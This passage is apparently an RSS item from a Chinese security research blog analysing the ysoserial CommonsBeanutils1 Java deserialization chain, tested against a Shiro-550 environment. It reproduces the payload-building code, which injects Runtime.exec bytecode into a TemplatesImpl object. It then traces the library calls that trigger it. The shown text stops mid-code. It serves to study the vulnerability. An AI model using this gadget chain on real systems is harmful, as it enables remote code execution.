<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>安全研究 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/</link><description>Recent content in 安全研究 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Fri, 12 Jan 2024 14:32:08 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/index.xml" rel="self" type="application/rss+xml"/><item><title>CommonsBeanutils1 Chain</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</link><pubDate>Fri, 12 Jan 2024 14:32:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/</guid><description><h3 id="概述">概述</h3><p>在ysoserial中实现了<code>CommonsBeanutils1</code>反序列化链，可以利用这个链执行代码。</p><h3 id="细节">细节</h3><p>在ysoserial中实现<code>CommonsBeanutils1</code>代码如下，首先<code>new BeanComparator/PriorityQueue</code>对象，在<code>PriorityQueue</code>对象内添加两个int对象，而后通过反射修改property字段存储的值</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">CommonsBeanutils1</span><span style="color:#66d9ef">implements</span> ObjectPayload<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span> {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getObject</span>(<span style="color:#66d9ef">final</span> String command)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Object templates<span style="color:#f92672">=</span> Gadgets.<span style="color:#a6e22e">createTemplatesImpl</span>(command);</span></span><span style="display:flex;"><span><span style="color:#75715e">// mock method name until armed</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> BeanComparator comparator<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> BeanComparator(<span style="color:#e6db74">"lowestSetBit"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// create queue with numbers and basic comparator</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span> queue<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">></span>(2, comparator);</span></span><span style="display:flex;"><span><span style="color:#75715e">// stub data for replacement later</span></span></span><span style="display:flex;"><span> queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">"1"</span>));</span></span><span style="display:flex;"><span> queue.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> BigInteger(<span style="color:#e6db74">"1"</span>));</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// switch method called by comparator</span></span></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(comparator,<span style="color:#e6db74">"property"</span>,<span style="color:#e6db74">"outputProperties"</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// switch contents of queue</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Object<span style="color:#f92672">[]</span> queueArray<span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) Reflections.<span style="color:#a6e22e">getFieldValue</span>(queue,<span style="color:#e6db74">"queue"</span>);</span></span><span style="display:flex;"><span> queueArray<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span><span style="color:#f92672">=</span> templates;</span></span><span style="display:flex;"><span> queueArray<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span><span style="color:#f92672">=</span> templates;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> queue;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span> Object<span style="color:#a6e22e">createTemplatesImpl</span>(String command)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> Boolean.<span style="color:#a6e22e">parseBoolean</span>(System.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">"properXalan"</span>,<span style="color:#e6db74">"false"</span>))<span style="color:#f92672">?</span> createTemplatesImpl(command, Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>), Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"org.apache.xalan.xsltc.runtime.AbstractTranslet"</span>), Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">"org.apache.xalan.xsltc.trax.TransformerFactoryImpl"</span>)) : createTemplatesImpl(command, TemplatesImpl.<span style="color:#a6e22e">class</span>, AbstractTranslet.<span style="color:#a6e22e">class</span>, TransformerFactoryImpl.<span style="color:#a6e22e">class</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#f92672">&lt;</span>T<span style="color:#f92672">></span> T<span style="color:#a6e22e">createTemplatesImpl</span>(String command, Class<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">></span> tplClass, Class<span style="color:#f92672">&lt;?></span> abstTranslet, Class<span style="color:#f92672">&lt;?></span> transFactory)<span style="color:#66d9ef">throws</span> Exception {</span></span><span style="display:flex;"><span> T templates<span style="color:#f92672">=</span> tplClass.<span style="color:#a6e22e">newInstance</span>();</span></span><span style="display:flex;"><span> ClassPool pool<span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();</span></span><span style="display:flex;"><span> pool.<span style="color:#a6e22e">insertClassPath</span>(<span style="color:#66d9ef">new</span> ClassClassPath(StubTransletPayload.<span style="color:#a6e22e">class</span>));</span></span><span style="display:flex;"><span> pool.<span style="color:#a6e22e">insertClassPath</span>(<span style="color:#66d9ef">new</span> ClassClassPath(abstTranslet));</span></span><span style="display:flex;"><span> CtClass clazz<span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(StubTransletPayload.<span style="color:#a6e22e">class</span>.<span style="color:#a6e22e">getName</span>());</span></span><span style="display:flex;"><span> String cmd<span style="color:#f92672">=</span><span style="color:#e6db74">"java.lang.Runtime.getRuntime().exec(\""</span><span style="color:#f92672">+</span> command.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">"\\"</span>,<span style="color:#e6db74">"\\\\"</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">"\""</span>,<span style="color:#e6db74">"\\\""</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">"\");"</span>;</span></span><span style="display:flex;"><span> clazz.<span style="color:#a6e22e">makeClassInitializer</span>().<span style="color:#a6e22e">insertAfter</span>(cmd);</span></span><span style="display:flex;"><span> clazz.<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">"ysoserial.Pwner"</span><span style="color:#f92672">+</span> System.<span style="color:#a6e22e">nanoTime</span>());</span></span><span style="display:flex;"><span> CtClass superC<span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(abstTranslet.<span style="color:#a6e22e">getName</span>());</span></span><span style="display:flex;"><span> clazz.<span style="color:#a6e22e">setSuperclass</span>(superC);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> classBytes<span style="color:#f92672">=</span> clazz.<span style="color:#a6e22e">toBytecode</span>();</span></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates,<span style="color:#e6db74">"_bytecodes"</span>,<span style="color:#66d9ef">new</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{classBytes, ClassFiles.<span style="color:#a6e22e">classAsBytes</span>(Foo.<span style="color:#a6e22e">class</span>)});</span></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates,<span style="color:#e6db74">"_name"</span>,<span style="color:#e6db74">"Pwnr"</span>);</span></span><span style="display:flex;"><span> Reflections.<span style="color:#a6e22e">setFieldValue</span>(templates,<span style="color:#e6db74">"_tfactory"</span>, transFactory.<span style="color:#a6e22e">newInstance</span>());</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> templates;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而后通过反射将PriorityQueue对象存储的两个BigInteger对象改为创建的TemplatesImpl对象。<img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/1.png"/></p><p><strong>根因分析</strong>
根据前面调试知道，<code>CommonsBeanutils1</code>序列化<code>PriorityQueue</code>对象，其中<code>comparator</code>指定为<code>BeanComparator</code>，<code>PriorityQueue</code>内存了两个<code>TemplatesImpl</code>对象。</p><p>使用<a href="/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/">shiro 550</a>环境，发送payload，在调试器中可以看到，首先反序列化<code>PriorityQueue</code>对象<img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/2.png"/></p><p>在readObject断点，可以看到尝试反序列化<code>comparator</code>，这里是<code>BeanComparator</code>，并递归反序列化<code>TemplatesImpl</code><img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/3.png"/></p><p>而后readObject会调用heapify方法，跟进调用最后调用到comparator.compare</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">heapify</span>() {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> (size<span style="color:#f92672">>>></span> 1)<span style="color:#f92672">-</span> 1; i<span style="color:#f92672">>=</span> 0; i<span style="color:#f92672">--</span>)</span></span><span style="display:flex;"><span> siftDown(i, (E) queue<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">siftDown</span>(<span style="color:#66d9ef">int</span> k, E x) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (comparator<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> siftDownUsingComparator(k, x);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> siftDownComparable(k, x);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">siftDownUsingComparator</span>(<span style="color:#66d9ef">int</span> k, E x) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> half<span style="color:#f92672">=</span> size<span style="color:#f92672">>>></span> 1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (k<span style="color:#f92672">&lt;</span> half) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> child<span style="color:#f92672">=</span> (k<span style="color:#f92672">&lt;&lt;</span> 1)<span style="color:#f92672">+</span> 1;</span></span><span style="display:flex;"><span> Object c<span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> right<span style="color:#f92672">=</span> child<span style="color:#f92672">+</span> 1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (right<span style="color:#f92672">&lt;</span> size<span style="color:#f92672">&amp;&amp;</span></span></span><span style="display:flex;"><span> comparator.<span style="color:#a6e22e">compare</span>((E) c, (E) queue<span style="color:#f92672">[</span>right<span style="color:#f92672">]</span>)<span style="color:#f92672">></span> 0)</span></span><span style="display:flex;"><span> c<span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child<span style="color:#f92672">=</span> right<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (comparator.<span style="color:#a6e22e">compare</span>(x, (E) c)<span style="color:#f92672">&lt;=</span> 0)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">break</span>;</span></span><span style="display:flex;"><span> queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span><span style="color:#f92672">=</span> c;</span></span><span style="display:flex;"><span> k<span style="color:#f92672">=</span> child;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span><span style="color:#f92672">=</span> x;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>BeanComparator实现了Comparator接口，compare方法代码如下，其会调用getProperty方法，前面在ysoserial中property被设置为outputProperities</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">compare</span>(T o1, T o2) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span><span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(o1, o2);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> Object value1<span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o1,<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);</span></span><span style="display:flex;"><span> Object value2<span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o2,<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(value1, value2);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (IllegalAccessException var5) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">"IllegalAccessException: "</span><span style="color:#f92672">+</span> var5.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (InvocationTargetException var6) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">"InvocationTargetException: "</span><span style="color:#f92672">+</span> var6.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (NoSuchMethodException var7) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">"NoSuchMethodException: "</span><span style="color:#f92672">+</span> var7.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/4.png"/></p><p>跟进getProperty方法内，其中bean为<code>TemplatesImpl</code>对象，会进入<code>bean = this.getSimpleProperty(bean, name);</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span> Object<span style="color:#a6e22e">getProperty</span>(Object bean, String name)<span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> PropertyUtilsBean.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getProperty</span>(Object bean, String name)<span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getNestedProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getNestedProperty</span>(Object bean, String name)<span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bean<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"No bean specified"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (name<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"No name specified for bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">hasNested</span>(name)) {</span></span><span style="display:flex;"><span> String next<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">next</span>(name);</span></span><span style="display:flex;"><span> Object nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bean<span style="color:#66d9ef">instanceof</span> Map) {</span></span><span style="display:flex;"><span> nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyOfMapBean</span>((Map)bean, next);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(next)) {</span></span><span style="display:flex;"><span> nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getMappedProperty</span>(bean, next);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(next)) {</span></span><span style="display:flex;"><span> nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getIndexedProperty</span>(bean, next);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> nestedBean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getSimpleProperty</span>(bean, next);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (nestedBean<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> NestedNullException(<span style="color:#e6db74">"Null property value for '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span> nestedBean;</span></span><span style="display:flex;"><span> name<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">remove</span>(name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bean<span style="color:#66d9ef">instanceof</span> Map) {</span></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyOfMapBean</span>((Map)bean, name);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(name)) {</span></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getMappedProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(name)) {</span></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getIndexedProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> bean<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getSimpleProperty</span>(bean, name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> bean;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>在<code>getSimpleProperty</code>方法内会通过反射获取到<code>TemplatesImpl</code>对象<code>property</code>对应的的getter方法并调用，在java规范中outputProperities对应的getter方法名应该为getOutputProperities</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">getSimpleProperty</span>(Object bean, String name)<span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (bean<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"No bean specified"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (name<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"No name specified for bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">hasNested</span>(name)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"Nested property names are not allowed: Property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(name)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"Indexed property names are not allowed: Property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(name)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">"Mapped property names are not allowed: Property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on bean class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (bean<span style="color:#66d9ef">instanceof</span> DynaBean) {</span></span><span style="display:flex;"><span> DynaProperty descriptor<span style="color:#f92672">=</span> ((DynaBean)bean).<span style="color:#a6e22e">getDynaClass</span>().<span style="color:#a6e22e">getDynaProperty</span>(name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (descriptor<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">"Unknown property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on dynaclass '"</span><span style="color:#f92672">+</span> ((DynaBean)bean).<span style="color:#a6e22e">getDynaClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ((DynaBean)bean).<span style="color:#a6e22e">get</span>(name);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> PropertyDescriptor descriptor<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyDescriptor</span>(bean, name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (descriptor<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">"Unknown property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' on class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> Method readMethod<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getReadMethod</span>(bean.<span style="color:#a6e22e">getClass</span>(), descriptor);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (readMethod<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> NoSuchMethodException(<span style="color:#e6db74">"Property '"</span><span style="color:#f92672">+</span> name<span style="color:#f92672">+</span><span style="color:#e6db74">"' has no getter method in class '"</span><span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>()<span style="color:#f92672">+</span><span style="color:#e6db74">"'"</span>);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> Object value<span style="color:#f92672">=</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">invokeMethod</span>(readMethod, bean, EMPTY_OBJECT_ARRAY);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> value;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/5.png"/></p><p><code>TemplatesImpl</code>类中<code>getOutputProperties</code>方法代码如下，会调用<code>newTransformer</code>方法</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">synchronized</span> Properties<span 